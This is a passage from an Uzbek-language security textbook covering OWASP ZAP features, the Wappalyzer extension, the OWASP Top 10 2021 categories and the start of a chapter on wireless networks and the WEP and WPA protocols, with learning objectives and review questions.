Passive (Passiv): ZAP ushbu eng sodda skanerlashni HTTPS so‘rovlari ustida avtomatik tarzda amalga oshiradi va asosiy tahdidlarni aniqlaydi. So‘rovlarning o‘zi o‘zgartirilmaydi.
OWASP ZAP Fuzzer
Katta hajmdagi xavfsizlik testlarini o‘tkazish uchun ZAP kengaytirilgan Fuzzer imkoniyatiga ega. Bu vosita juda katta ma’lumotlar to‘plami doirasida (maxsus kiruvchi ma’lumotlar asosida) sinov o‘tkazadi. Bunda mutaxassislar o‘zlarining maxsus payloadlarini yaratishi yoki ichki (built-in) payloadlardan foydalanishi mumkin.
OWASP ZAP API
API xavfsizligini yaxshiroq testlash uchun ZAP HTML, XML va JSON kabi yetakchi API formatlari bilan ishlay oladigan kengaytirilgan API funksiyasini taqdim etadi. Standart holatda ZAP faqat o‘zi o‘rnatilgan mashinadan keladigan API ulanishlariga ruxsat beradi. Biroq, konfiguratsiya fayli orqali har qanday API ulanishiga ruxsat berish mumkin.
WebSocket Testlash
ZAP keng qamrovli WebSocket testlashni amalga oshira oladi. U server va mijoz o‘rtasida almashinayotgan WebSocket trafikni avtomatik ravishda tahlil qiladi va ushlab qoladi.
AJAX Spidering
ZAP AJAX so‘rovlarni aniqlay olmaydigan oddiy spider dasturlari bilan topib bo‘lmaydigan AJAX asosidagi web-ilova so‘rovlarini sinovdan o‘tkazish uchun AJAX Spidering funksiyasiga ega.
ZAP nafaqat AJAX so‘rovlarni aniqlaydi, balki quyidagi qo‘shimcha imkoniyatlarga ham ega: har bir URL manzilni tekshirish (crawling states), maksimal tekshirish chuqurligi (max depth), eng yuqori davomiylik (maximum duration) va boshqa ko‘plab parametrlar bilan sozlanishi mumkin.
Skanerlash siyosatini boshqarish (Scan Policy Manager)
ZAP yordamida tashkilotlar o‘z xavfsizlik maqsadlariga mos keladigan skanerlash siyosatini yaratishi mumkin. Scan Policy Manager juda yuqori darajada moslashtiriladi. Pentesterlar vositani ma’lum ilovalarga yo‘naltirishlari va alohida skanerlash parametrlarini qo‘shishlari mumkin.
Skanerlash siyosati orqali tashkilot quyidagilarni belgilay oladi: qaysi testlar qaysi ilovalarda o‘tkazilishi kerakligi, threshold, strength kabi parametrlar. ZAPda yaratilgan siyosatni shablon sifatida osongina eksport qilish mumkin bo‘lib, bu uning qayta foydalanishini yengillashtiradi.
ZAP Marketplace
OWASP ZAP o‘zining raqamli marketplaceini taklif qilib, u web va API xavfsizligining barcha ehtiyojlarini qondirishga mo‘ljallangan. Ushbu raqamli platformada juda ko‘p miqdordagi ochiq manbali plaginlar va qo‘shimchalarni o‘z ichiga oladi.
Ularning barchasi ZAP jamoasi tomonidan ishlab chiqilganligi sababli, ular ishonchli. Marketplace orqali qidiruv qilib, kerakli plagin yoki qo‘shimchani tanlab o‘rnatishingiz mumkin.
Wappalyzer vositasi
Brauzer kengaytmalari, shuningdek qo‘shimchalar (add-ons) deb ham ataladi, Google Chrome, Opera va boshqalar kabi mashhur web-brauzerlar imkoniyatlarini kengaytirishga yordam beradigan brauzer asosidagi ilovalardir. Ular turli nomlar bilan yuritilishi mumkin - browser extensions, add-ons, plug-ins. Deyarli barcha brauzerlar qo‘shimcha funksiyalarni o‘rnatishni qo‘llab-quvvatlaydi.
Wappalyzer nima?
Wappalyzer - bu web-saytning tarkibiy texnologiyalarini aniqlash bo‘yicha “onlayn detektiv”. Kengaytmani brauzerga o‘rnatilganidan so‘ng, istalgan web-saytga tashrif buyurib va Wappalyzer belgisi ustiga bosish bilan sayt foydalanayotgan texnologiyalarning batafsil ro‘yxatini ko‘rish mumkin.
Wappalyzerning asosiy xususiyatlari
Texnologiyalarni aniqlash: WordPress, Shopify va boshqa CMSlar, web-freymvorklar, analitika vositalari, marketing avtomatlashtirish platformalari va yana ko‘plab saytni ishlatib turgan texnologiyalarni aniqlaydi.
Web-saytlarni tasniflash: Wappalyzer web-saytlarni texnologiya turlariga ko‘ra guruhlaydi, bu esa bozor tahlili uchun tezkor umumiy ko‘rinishni taqdim etadi.
Oson integratsiya: Chrome, Firefox va Edge kabi mashhur brauzerlar bilan muammosiz ishlaydi.
Doimiy yangilanish: texnologiyalarni aniqlash imkoniyati muntazam ravishda takomillashtirib boriladi.
Qo‘shimchalarning afzalliklari
	•	tezkor foydalanish imkonini beradi;
	•	intuitiv boshqaruvni taqdim etadi;
	•	turli platformalarda ishlaydi va har qanday brauzerga moslashadi;
	•	odatda qabul qilinmaydigan obyektlarni ham integratsiya qilish mumkin;
	•	OT yadrosidan foydalanish bo‘lmagan mahsulotlarga ham funksiyalarini qo‘shish imkonini beradi;
	•	tizimlar va bulutli saqlash xizmatlarini yagona ish maydoniga birlashtiradi.
Qo‘shimchalarning kamchiliklari
	•	doimiy yangilanib turishni talab qiladi;
	•	har bir brauzer uchun alohida moslashtirilgan versiya kerak bo‘ladi;
	•	ular ko‘pincha foydalanuvchi tashrif buyurgan sahifadagi barcha ma’lumotlarni o‘qish yoki hatto o‘zgartirish huquqini talab qiladi, bu esa ba’zan jiddiy ma’lumot buzilishlariga, parollarni qo‘lga kiritishga, brauzer faoliyatini kuzatishga olib kelishi mumkin.
O‘rnatish
Wappalyzerni o‘rnatish boshqa brauzer kengaytmalarini o‘rnatishga o‘xshaydi va faqat uch bosqichdan iborat:
1-qadam: Chrome Web Store yoki Firefox Add-Ons orqali Wappalyzer sahifasiga kiring (5.8-rasm).

5.8-rasm. Wappalyzer sahifasiga kirish
2-qadam: Brauzeringizga mos ravishda “Add to Chrome” yoki “Add to Firefox” tugmasini bosing (5.9-rasm).

5.9-rasm. Wappalyzerni Chrome brauzeriga qo‘shish
3-qadam: Tasdiqlash uchun “Add” tugmasini bosing (5.10-rasm).

5.10-rasm. Wappalyzerni Chrome brauzeriga qo‘shishga rozilik berish
Nihoyat, Wappalyzer o‘rnatildi. O‘rnatish muvaffaqiyatli yakunlangach, brauzeringizning yuqori o‘ng burchagida uning ikonkasi paydo bo‘ladi (5.11-rasm).

5.11-rasm. Wappalyzerni Chrome brauzeridagi ikonkasi
Foydalanish:
Wappalyzerdan foydalanish juda oson: istalgan web-saytga tashrif buyuring, Wappalyzer ikonkasi ustiga kursorni olib boring, bosib qo‘ying va kerakli ma’lumot ekranda paydo bo‘ladi.
1-misol: Bu www.shakzee.com sayti haqida ma’lumotdir. Sayt WordPressda yaratilgani, Yoast SEOdan foydalanayotgani va qaysi JavaScript kutubxonalaridan foydalanayotgani ko‘rinmoqda (5.12-rasm).

5.12-rasm. www.shakzee.com sayti haqida ma’lumot
2-misol: Quyida www.hackerrank.com sayti haqida ma’lumot berilgan. U jQuery Migrate 3.3.2 va jQuery 3.5.1dan foydalanadi, shuningdek WordPress asosida yaratilgan (5.13-rasm).

5.13-rasm. www.hackerrank.com sayti haqida ma’lumot
	Burp Suitening Intercepting Proxy funksiyasi qanday maqsadda qo‘llaniladi?
	•	OWASP ZAPda aktiv va passiv skanerlash o‘rtasidagi farq nimada?
	•	Burp Suitedagi Intruder vositasi qanday turdagi hujumlar uchun ishlatiladi?
	•	Wappalyzer brauzer kengaytmasi web-saytlar haqida qanday turdagi texnik ma’lumotlarni ko‘rsatadi?
	•	OWASP ZAP Fuzzer vositasi xavfsizlik testida qanday vazifani bajaradi?
	•	Repeater vositasidan foydalanishning asosiy maqsadi nima?
	•	Nima sababdan ba’zi saytlar Wappalyzer tomonidan kamroq texnologiya ma’lumotlarini ko‘rsatadi?
	•	Spider/Crawler vositalari web-ilovalarni tahlil qilish jarayonida qanday ahamiyatga ega?
Nazorat savollari
	•	Burp Suitening Intercepting Proxy funksiyasi qanday maqsadda qo‘llaniladi?
	•	OWASP ZAPda aktiv va passiv skanerlash o‘rtasidagi farq nimada?
	•	Burp Suitedagi Intruder vositasi qanday turdagi hujumlar uchun ishlatiladi?
	•	Wappalyzer brauzer kengaytmasi web-saytlar haqida qanday turdagi texnik ma’lumotlarni ko‘rsatadi?
	•	OWASP ZAP Fuzzer vositasi xavfsizlik testida qanday vazifani bajaradi?
	•	Repeater vositasidan foydalanishning asosiy maqsadi nima?
	•	Nima sababdan ba’zi saytlar Wappalyzer tomonidan kamroq texnologiya ma’lumotlarini ko‘rsatadi?
	•	Spider/Crawler vositalari web-ilovalarni tahlil qilish jarayonida qanday ahamiyatga ega?
Nazorat savollari

5.5. OWASP TOP 10 zaifliklari  (Ma’ruza mashg‘uloti)
1. OWASP loyihasi, maqsadi va dasturiy vositalari. 
2. OWASP TOP 10 zaifliklar ro‘yxati.
Reja:
1. OWASP loyihasi, maqsadi va dasturiy vositalari. 
2. OWASP TOP 10 zaifliklar ro‘yxati.
Reja:

OWASP loyihasi, OWASP ZAP, WebGoat, OWASP TOP 10 zaifliklar ro‘yxati.
Kalit so‘zlar:
OWASP loyihasi, OWASP ZAP, WebGoat, OWASP TOP 10 zaifliklar ro‘yxati.
Kalit so‘zlar:
OWASP loyihasi, maqsadi va dasturiy vositalari
OWASP (Open Worldwide Application Security Project, ilgari Open Web Application Security Project) - bu IoT, tizim dasturlari va web-ilovalar xavfsizligi bo‘yicha ochiq manbali ma’lumotlar va resurslarni e’lon qiluvchi onlayn hamjamiyatdir. Uni notijorat tashkilot - The OWASP Foundation boshqaradi.
Loyiha tarixi
Mark Curphey 2001-yil 9-sentyabrda OWASPni tashkil etgan. Jeff Williams 2003-yil oxiridan 2011-yil sentyabrigacha OWASPning ko‘ngilli raisi bo‘lib ishlagan. 2015-yilda Matt Konda Kengash raisi bo‘lgan. The OWASP Foundation AQShda 2004-yilda tashkil etilgan 501(c)(3) maqomidagi notijorat tashkilot bo‘lib, OWASP infratuzilmasi va loyihalarini qo‘llab-quvvatlaydi. 2011-yildan boshlab OWASP Belgiyada ham OWASP Europe VZW nomi bilan notijorat sifatida ro‘yxatdan o‘tgan. 2023-yil fevral oyida Global Boshqaruv Kengashi a’zosi Bil Corry Twitterda loyiha nomidagi “Web” so‘zi “Worldwide” ga almashtirilgani haqida xabar bergan. 2023-yil may oyida OWASP Gen AI Security Project ishga tushirilib, OWASP Top 10 ro‘yxatini LLM xavflarini hujjatlashtirish yo‘nalishida kengaytirishni maqsad qilgan.
Loyiha tomonidan ishlab chiqilgan vositalar:
	•	OWASP ZAP - penetratsion testlash vositasi;
	•	WebGoat - xavfsiz dasturlash amaliyotlari bo‘yicha qo‘llanma sifatida yaratilgan, ataylabdan zaif qilingan web-ilova.
Loyiha tomonidan taqdim etilib kelinayotgan nashrlar:
	•	OWASP Top Ten - 2003-yildan beri chop etiladigan eng muhim ilova xavfsizligi zaifliklarining yillik ro‘yxati. Bu loyiha MITRE, PCI DSS, DISA-STIG va AQSh Federal Savdo Komissiyasi kabi ko‘plab tashkilotlar tomonidan manba sifatida ishlatiladi.
	•	OWASP Development Guide;
	•	OWASP Testing Guide;
	•	OWASP Code Review Guide;
	•	OWASP Top 10 Incident Response Guidance.
Loyiha tomonidan taqdim etilgan modellar va standartlar:
	•	OWASP Software Assurance Maturity Model;
	•	OWASP Application Security Verification Standard (ASVS) - ilova darajasidagi xavfsizlik tekshiruvlari uchun standart.
Loyiha tomonidan taqdim etilgan boshqa ishlanmalar:
	•	OWASP XML Security Gateway (XSG) Evaluation Criteria Project;
	•	OWASP AppSec Pipeline;
	•	OWASP Automated Threats to Web Applications;
	•	OWASP API Security Project;
	•	OWASP AI Maturity Assessment Project (AIMA).
OWASP TOP 10 zaifliklar ro‘yxati
OWASP Top 10 - bu dunyo bo‘ylab xavfsizlik bo‘yicha mutaxassislarning kelishuviga asoslangan holda aniqlangan web-ilovalar uchun eng muhim xavfsizlik zaifliklarining ro‘yxatidir. OWASP Top 10 kompaniyalar, DevOps jamoalari, tartibga soluvchilar va web-ilovalar xavfsizligini ta’minlash hamda dasturiy ta’minot ishlab chiqish tartibini yanada xavfsiz kod yozishga yo‘naltirish vazifasi yuklangan boshqa manfaatdor tomonlar uchun qo‘llanma bo‘lib xizmat qiladi. Ushbu ro‘yxatning 2017 va 2021-yilda chiqqan versiyalari quyida keltirilgan. Hozirda 2025-yil versiyasi ustida yakuniy ishlar olib borilayotgani sababli, quyida 2021-yilda nashr etilgan rasmiy zaifliklar ro‘yxati bilan yaqindan tanishib chiqiladi (5.14-rasm).

5.14-rasm. OWASP Top 10 ro‘yxatining 2017 va 2021-yillardagi o‘zgarishlari
A01:2021 - Buzilgan foydalanish nazorati (Broken Access Control) beshinchi o‘rindan eng jiddiy web-ilova xavfsizlik xatarlari toifasiga ko‘tarilgan; taqdim etilgan ma’lumotlarga ko‘ra, test qilingan ilovalarning o‘rtacha 3,81%ida Zaifliklarning umumiy tasnifi (Common Weakness Enumerations, CWEs) kamida bittadan yoki undan ortiq zaifliklar aniqlangan bo‘lib, ushbu toifaga kiruvchi CWElarda 318 mingdan ortiq holat qayd etilgan. Broken Access Control bilan bog‘langan 34 ta CWE boshqa barcha toifalarga nisbatan ilovalarda eng ko‘p uchragan.
A02:2021 - Kriptografik xatoliklar (Cryptographic Failures) bitta o‘ringa ko‘tarilib, 2-o‘rinni egallaydi; ilgari bu toifa A3:2017 - Maxfiy ma’lumotlarning oshkor bo‘lishi (Sensitive Data Exposure) deb yuritilgan bo‘lib, u asl sabablardan ko‘ra kengroq simptomlarni ifodalagan edi. Yangilangan nom kriptografiyaga oid xatoliklarga diqqatni qaratadi. Ushbu toifa ko‘pincha maxfiy ma’lumotlarning oshkor bo‘lishiga yoki tizimning buzilishiga olib keladi.
A03:2021 - Inyeksiya hujumlari (Injection) uchinchi o‘ringa pasaygan. Ilovalarning 94%ida biror ko‘rinishdagi inyeksiya hujumlari test qilingan, maksimal uchrashish darajasi 19%, o‘rtacha darajasi 3,37% ga teng bo‘lgan. Ushbu toifaga bog‘langan 33 ta CWE ilovalarda 274 ming marta uchragan bo‘lib, ikkinchi eng yuqori ko‘rsatkichdir. Cross-site Scripting (XSS) endi ushbu toifaning tarkibiga kiritilgan.
A04:2021 - Xavfsiz bo‘lmagan loyihalash (Insecure Design) 2021-yil uchun yangi toifa bo‘lib, loyihalashdagi xatoliklarga oid xatarlarga e’tibor qaratadi. Xavfsiz bo‘lmagan loyihalashni “mukammal” dasturiy amalga oshirish bilan tuzatib bo‘lmaydi, chunki mazkur holda zarur himoya mexanizmlari avvaldan o‘zi mavjud bo‘lmaydi.
A05:2021 - Xavfsizlikning noto‘g‘ri sozlanishi (Security Misconfiguration) avvalgi nashrdagi 6-o‘rindan ko‘tarilgan; ilovalarning 90%i noto‘g‘ri sozlash bo‘yicha test qilingan, o‘rtacha uchrashish ko‘rsatkichi 4,5% bo‘lib, CWElarga bog‘liq 208 mingdan ortiq holat qayd etilgan. Dasturiy ta’minotning tobora ko‘proq sozlanadigan bo‘lib borishi bu toifaning ko‘tarilishiga sabab bo‘lgan. Ilgari mustaqil toifa bo‘lgan A4:2017 - XML tashqi obyektlari (XML External Entities, XXE) endi ushbu toifa tarkibiga kiritilgan.
A06:2021 - Zaif va eskirgan komponentlar (Vulnerable and Outdated Components) ilgari ma’lum zaifliklarga ega komponentlardan foydalanish (Using Components with Known Vulnerabilities) deb nomlangan; Top 10 hamjamiyat so‘rovida 2-o‘rinda bo‘lgan va ma’lumotlar tahliliga ko‘ra ham Top 10ga kirishga yetarli dalilga ega. Bu toifa 2017-yilgi 9-o‘rindan ko‘tarilgan. Bunda xavfni baholash va test qilish qiyin hisoblanadi. Ushbu toifada CWElarga mos keluvchi birorta umumiy zaifliklar va ta’sirlar ro‘yxati CVE (Common Vulnerability and Exposures)da yo‘q, shuning uchun zaiflik (exploit) va ta’sir (impact) ko‘rsatkichlari standart ravishda 5,0 sifatida qo‘llanadi.
A07:2021 - Identifikatsiya va autentifikatsiya xatoliklari (Identification and Authentication Failures) ilgari buzilgan autentifikatsiya (Broken Authentication) deb yuritilgan bo‘lib, ikkinchi o‘rindan pastlagan. Endi bu toifa identifikatsiya bilan bog‘liq ko‘proq xatoliklarni o‘z ichiga oladi. Ushbu toifa hanuz Top 10 da bo‘lsada, standartlashtirilgan autentifikatsiya freymvorklarining keng qo‘llanilishi vaziyatni biroz yaxshilab bormoqda.
A08:2021 - Dastur va ma’lumot yaxlitligi xatoliklari (Software and Data Integrity Failures) 2021-yil uchun yangi toifa bo‘lib, dasturiy yangilanishlar, muhim ma’lumotlar yoki CI/CD (Continuous Integration/ Continuous Delivery/Deployment) ishlash oqimi haqidagi yaxlitlik farazlari tekshiruvsiz qoldirilganda yuzaga keladigan xavflarga e’tibor qaratadi. Ushbu toifadagi 10 ta CWE CVE/CVSS (Common Vulnerability Scoring System - Zaifliklarni umumiy baholash tizimi) ma’lumotlariga ko‘ra eng yuqori ta’sir (impact) og‘irligiga ega. A8:2017 - Insecure Deserialization endi ushbu kengroq toifaning tarkibidir.
A09:2021 - Xavfsizlik jurnal va monitoring xatoliklari (Security Logging and Monitoring Failures) ilgari A10:2017 – yetarli darajada loglash va kuzatuvning yo‘qligi (Insufficient Logging & Monitoring) hujumi edi va Top 10 hamjamiyat so‘rovining 3-natijasi sifatida 10-o‘rindan yuqoriga ko‘tarilgan. Ushbu toifa yanada kengaytirilgan bo‘lib, ko‘proq turdagi xatoliklarni qamrab oladi, uni testlash qiyin va CVE/CVSS ma’lumotlarida yaxshi yoritilmagan. Biroq, bu toifadagi xatoliklar hodisalarni aniqlash, ogohlantirish va kriminalistika jarayonlariga bevosita ta’sir qiladi.
A10:2021 – SSRF, server tomonida so‘rovlarni soxtalashtirish (Server-Side Request Forgery) Top 10 hamjamiyat so‘rovining 1-natijasi sifatida qo‘shilgan. Ma’lumotlar SSRFlarda minimal uchrashish darajasini, lekin yuqori test qamrovini, shuningdek ekspluatatsiya va ta’sir potentsialining o‘rtacha darajadan yuqori ekanini ko‘rsatadi. Bu toifa xavfsizlik hamjamiyati tomonidan muhim deb tan olinayotgan bo‘lsada, mavjud ma’lumotlarda hali to‘liq aks etmagan holatni ifodalaydi. 	OWASP Top 10 ro‘yxatining asosiy maqsadi nima va u kimlar uchun mo‘ljallangan?
	•	 Buzilgan foydalanish nazorati qanday xavflarni keltirib chiqaradi va nega 2021-yilda birinchi o‘ringa ko‘tarilgan?
	•	Kriptografik xatoliklar toifasi avvalgi yillardagi qaysi toifa nomi o‘rniga kiritilgan va o‘zgarish sababi nima?
	•	 Inyeksiya hujumlari nimadan iborat va 2021 ro‘yxatida qanday o‘zgarishlar bilan qayta tasniflandi?
	•	 Xavfsiz bo‘lmagan loyilash toifasining paydo bo‘lishiga nima sabab bo‘lgan va u qanday xavflarni oldini olishga qaratilgan?
	•	 Noto‘g‘ri xavfsizlik sozlamalari odatda qaysi xatolardan kelib chiqadi?
	•	Zaif va eskirgan komponentlar toifasi nega testlashda murakkab sanaladi va CVE bilan bog‘liq qanday xususiyatga ega?
	•	 Loglash va monitoring kamchiliklari xavfi hujumlarni aniqlash va kriminalistika jarayonlariga qanday ta’sir ko‘rsatadi?
Nazorat savollari
	•	OWASP Top 10 ro‘yxatining asosiy maqsadi nima va u kimlar uchun mo‘ljallangan?
	•	 Buzilgan foydalanish nazorati qanday xavflarni keltirib chiqaradi va nega 2021-yilda birinchi o‘ringa ko‘tarilgan?
	•	Kriptografik xatoliklar toifasi avvalgi yillardagi qaysi toifa nomi o‘rniga kiritilgan va o‘zgarish sababi nima?
	•	 Inyeksiya hujumlari nimadan iborat va 2021 ro‘yxatida qanday o‘zgarishlar bilan qayta tasniflandi?
	•	 Xavfsiz bo‘lmagan loyilash toifasining paydo bo‘lishiga nima sabab bo‘lgan va u qanday xavflarni oldini olishga qaratilgan?
	•	 Noto‘g‘ri xavfsizlik sozlamalari odatda qaysi xatolardan kelib chiqadi?
	•	Zaif va eskirgan komponentlar toifasi nega testlashda murakkab sanaladi va CVE bilan bog‘liq qanday xususiyatga ega?
	•	 Loglash va monitoring kamchiliklari xavfi hujumlarni aniqlash va kriminalistika jarayonlariga qanday ta’sir ko‘rsatadi?
Nazorat savollari
VI BOB. SIMSIZ TARMOQDA SUQILIB KIRISH TESTLARINI O‘TKAZISH

VI BOB. SIMSIZ TARMOQDA SUQILIB KIRISH TESTLARINI O‘TKAZISH





Ta’lim maqsadlari:
–	Wi-Fi xavfsizlik protokollari (WEP, WPA2, WPA3)ni ta’riflaydi, ularning kuchli va zaif tomonlarini tushuntiradi.
–	simsiz tarmoq trafikini kuzatadi, paketlarni ushlash orqali Wi-Fi handshake jarayonini aniqlaydi va izohlaydi;
–	simsiz hujum turlarini farqlaydi va ularning ishlash mexanizmini tahlil qiladi;
–	xavfsiz laboratoriya muhitida zararli AP hujumi modellashtiradi va uni aniqlash usullarini asoslaydi;
–	tarmoq skanerlash texnikalarini (ping sweep, port scanning) tushuntiradi hamda Nmap vositasining imkoniyatlarini izohlaydi;
–	Nmap yordamida lokal tarmoqni xavfsiz skanerlaydi, ochiq portlar va xizmatlarni aniqlaydi;
–	zaifliklarni baholash tushunchasini tahlil qiladi, aniqlangan zaifliklarni ustuvorlik bo‘yicha saralaydi;
–	OpenVAS (yoki o‘xshash vosita) yordamida virtual mashinada zaiflik skanerlashni amalga oshiradi va natijalarni baholaydi;
–	parol hujumlari (lug‘atga asoslangan, qo‘pol kuch, rainbow jadvali)ni taqqoslaydi, John the Ripper orqali sinov o‘tkazadi va Wi-Fi parollarining mustahkamligini baholaydi.
Bobni o‘zlashtirish uchun tavsiya etiladigan qo‘shimcha kurslar:
1. Tizimlar va tarmoqlarni himoyalash (Securing Systems and Networks) - https://www.coursera.org/learn/packt-security-systems-and-networks-zx4c5#modules 
2. Ulanish va Himoyalash: Tarmoqlar va Tarmoq Xavfsizligi (Connect and Protect: Networks and Network Security) - https://www.coursera.org/learn/networks-and-network-security#modules 
6-bob haqida umumiy ma’lumot
Mazkur bobda WI-FI tarmog‘ida foydalaniluvchi xavfsizlik protokollari, simsiz tarmoqlarga qaratilgan hujumlar, tarmoqni skanerlash usullari va vositalari, zaifliklarni baholash, ularning bosqichlari, zarur vositalar, parolga qaratilgan hujumlar haqida nazariy va amaliy ma’lumotlar tushuntiriladi.







6.1. WI-FI xavfsizlik protokollari  (Ma’ruza mashg‘uloti)
1. Simsiz tarmoq va uning turlari.
2. WEP, WPA, WPA2 va WPA3 protokollari.
3. Wi-Fi simsiz tarmog‘ida mavjud xavfsizlik muammolari.
Reja:
1. Simsiz tarmoq va uning turlari.
2. WEP, WPA, WPA2 va WPA3 protokollari.
3. Wi-Fi simsiz tarmog‘ida mavjud xavfsizlik muammolari.
Reja:

Simsiz tarmoq, simsiz lokal tarmoq (WLAN), Wi-Fi texnologiyasi (Wi-Fi Technology), foydalanish nuqtasi (Access Point, AP), WEP, WPA, WPA2, WPA3 protokollari.
Kalit so‘zlar:
Simsiz tarmoq, simsiz lokal tarmoq (WLAN), Wi-Fi texnologiyasi (Wi-Fi Technology), foydalanish nuqtasi (Access Point, AP), WEP, WPA, WPA2, WPA3 protokollari.
Kalit so‘zlar:
Simsiz tarmoq va uning turlari
Simsiz tarmoq (Wireless Network) – bu qurilmalar o‘rtasida ma’lumot almashish jarayoni elektromagnit to‘lqinlar orqali amalga oshiriladigan aloqa tizimidir. An’anaviy simli tarmoqlardan farqli ravishda, bu turdagi tarmoqlar kabel, optik tolali liniya yoki boshqa fizik uzatish vositalariga muhtoj bo‘lmaydi.
Simsiz aloqa texnologiyalari mobil qurilmalar, IoT (Internet of Things) tizimlari, sensor tarmoqlar, uy va korporativ tarmoqlar, shuningdek, keng ko‘lamli telekommunikatsiya infratuzilmalarida keng qo‘llaniladi.
Simsiz tarmoqning asosiy afzalliklari:
Harakatchanlik (mobility) - foydalanuvchi tarmoq qamrov doirasida erkin harakatlanishi mumkin.
Moslashuvchanlik (flexibility) - tarmoqni qisqa vaqt ichida tashkil etish va qayta konfiguratsiya qilish imkoniyati.
Kengayuvchanlik (scalability) - yangi qurilmalarni tez qo‘shish oson.
Narx samaradorligi (cost-effective) - kabel yotqizish harajatlarini kamaytiradi.
Kamchiliklari:
	•	elektromagnit shovqinlarga sezgir;
	•	havodan uzatishda ko‘plab xavfsizlik tahdidlari mavjud;
	•	masofa va to‘siqlarga qarab signal kuchi kamayishi mumkin.
Simsiz tarmoqlar odatda uch asosiy tarkibiy qismlardan iborat:

1. Uzatuvchi qurilmalar: Radiomodullar, Wi-Fi adapterlar, sensorlar, mobil telefonlar va IoT tugunlari ma’lumotni havoga uzatadi.
2. Qabul qiluvchi qurilmalar: Router, foydalanish nuqtasi (Access Point), bazaviy stansiya yoki boshqa mobil qurilmalar signallarni qabul qiladi.
3. Radiochastota muhiti:  Ma’lumotlar 2.4 GHz, 5 GHz, 900 MHz, 868 MHz, 60 GHz kabi litsenziyasiz yoki litsenziyalangan diapazonlarda uzatiladi.
Bog‘lanish ta’minlanadigan fizik hudud о‘lchamlariga bog‘liq holda simsiz tarmoqlarning quyidagi kategoriyalari farqlanadi (6.1-jadval):
	•	simsiz shaxsiy tarmoq (Wireless personal-area network, WPAN);
	•	simsiz lokal tarmoq (Wireless local-area network, WLAN);
	•	simsiz regional tarmoq (Wireless metropolitan-area network, WMAN);
	•	Simsiz global tarmoq (Wireless Wide-area network, WWAN).
6.1-jadval
Simsiz tarmoq usullari
Tarmoq turi
Ta’sir doirasi
Amalda foydala
nilishi
Mavjud standartlar
Qо‘llanish sohasi
Shaxsiy simsiz tarmoqlar
Foydalanuvchidan bevosita yaqinlikda
О‘rtacha
Bluetooth, IEEE 802.15, IRDA
Tashqi qurilmalar kabellarining о‘rnida
Lokal simsiz tarmoqlar
Binolar yoki ofislar orasida
Yuqori
IEEE 802.11, Wi-Fi va HiperLAN
Simli tarmoqlarni mobil kengaytirish
Regional simsiz tarmoqlar
Shaharlar orasida
Yuqori
IEEE 802.16, va WIMAX
Binolar va korxonalar va Internet orasida belgilangan simsiz bog‘lanish
Global simsiz tarmoqlar
Butun dunyo bо‘yicha
Past
CDPD, 2G, 2.5G, 3G, 4G
Butun dunyo bо‘yicha internetdan foydalanishda
WLAN Wi-Fi texnologiyasiga asoslanadi va uy, ofis, kampus, savdo markazi kabi joylarda keng qo‘llaniladi. WLAN texnologiyasi IEEE 802.11 standartlari (a/b/g/n/ac/ax/6E) asosida 2.4 GHz va 5 GHz diapazonlarda ishlaydi. Qamrov hududi 10 m dan 300 m gacha. WLANning afzalliklari quyidagilar:
	•	yuqori tezlik (600 Mbit/s – 10 Gbit/s);
	•	ko‘p foydalanuvchili ishlash imkoniyati;
	•	infrastruktura va ad-hoc rejimlarda ishlashi.
WEP, WPA, WPA2 va WPA3 protokollari
Radioaloqa fizik jihatdan ochiq bo‘lib, signal har qanday yo‘nalishga tarqalgani bois simsiz tarmoqlarda xavfsizlikni ta’minlash muhim vazifa hisoblanadi. Shuning uchun Wi-Fi tarmoqlarida uzatmalarni shifrlash va foydalanuvchini autentifikatsiyalash uchun maxsus kriptografik protokollar ishlab chiqilgan.
Ularning evolyutsiyasi 802.11 standartining xavfsizlik bo‘limi doirasida ketma-ket rivojlangan: WEP → WPA → WPA2 → WPA3. 
Har bir avlod avvalgilaridagi zaifliklarni bartaraf etish uchun yaratilgan.
WEP (Wired Equivalent Privacy) protokoli. WEP protokoli 1997-yilda birinchi 802.11 standartida tasdiqlangan Wi-Fi xavfsizlik protokoli bo‘lib, uning asosiy maqsadi simli tarmoqdagi xavfsizlik darajasini simsiz muhitda ta’minlash edi.
Ushbu protokolning asosiy texnik xususiyatlari:
	•	Shifrlash algoritmi: RC4 (oqimli shifr);
	•	Kalit uzunligi: 40 bit, 104 bit (kalit) + 24-bit IV;
	•	Autentifikatsiya usullari:
	•	Ochiq tizimli autentifikatsiyasi (Open System Authentication);
	•	Taqsimlangan kalitga asoslangan autentifikatsiya (Shared Key Authentication).
 WEP protokolining ishlash prinsipi: har bir paket RC4 algoritmi yordamida shifrlanadi. Kalitga IV (Initialization Vector) qo‘shilib, RC4 oqimi hosil qilinadi. Paketga yaxlitlikni tekshirishga imkon beruvchi ICV (Integrity Check Value) qiymat qo‘shiladi.
WEP bugungi kunda mutlaqo xavfsiz emas, chunki:
	•	IV juda qisqa (24 bit) → tez-tez takrorlanadi;
	•	RC4 kalit hosil qilish mexanizmi zaif → qator hujumlar mavjud;
	•	Paket yaxlitligi CRC32 orqali tekshiriladi → bu kriptografik algoritm emas.
	•	5–10 daqiqada kalitni topish mumkin.
WEPning amaldagi holati:
	•	2000-yillardan boshlab eskirgan deb hisoblanadi.
	•	barcha zamonaviy qurilmalarda foydalanish tavsiya etilmaydi.
WPA (Wi-Fi Protected Access) protokoli. Ushbu xavfsizlik protokoli 2003-yilda WEP o‘rniga vaqtinchalik yechim sifatida yaratilgan. WPA WEPning zaif tomonlarini bartaraf etish uchun TKIP mexanizmini joriy qildi.
Protokolning asosiy texnik xususiyatlari
	•	Shifrlash: TKIP (Temporal Key Integrity Protocol);
	•	Kalit boshqaruvi: 802.1X / EAP (Enterprise rejim);
	•	Yaxlitlik nazorati: MIC (Message Integrity Check);
	•	Dinamik kalit almashinuvi (Per-packet keying).
TKIP WEP ustida qurilgan bo‘lib, quyidagi afzalliklarga:
	•	Har paketga yangi kalit hosil qiladi;
	•	IV 48 bitga uzaytirilgan;
	•	MIC (Michael) himoyasi paket buzilishlarini aniqlaydi;
	•	Kalitlarni avtomatik ravishda aylantirish (rekeying).
WPA zaifliklari:
	•	TKIP RC4 algoritmiga asoslangan → shu sababli asosiy zaiflik saqlanib qolgan.
	•	Qo‘shimcha himoya qatlamlari bo‘lsada, qisman buzulishi mumkin.
	•	Ushbu protokolga nisbatan qator (ChopChop, Beck-Tews) hujumlar ishlab chiqilgan.
WPA protokoli zamonaviy tizimlar uchun tavsiya etilmaydi, faqat eski qurilmalar bilan moslik uchun saqlanib qolgan.
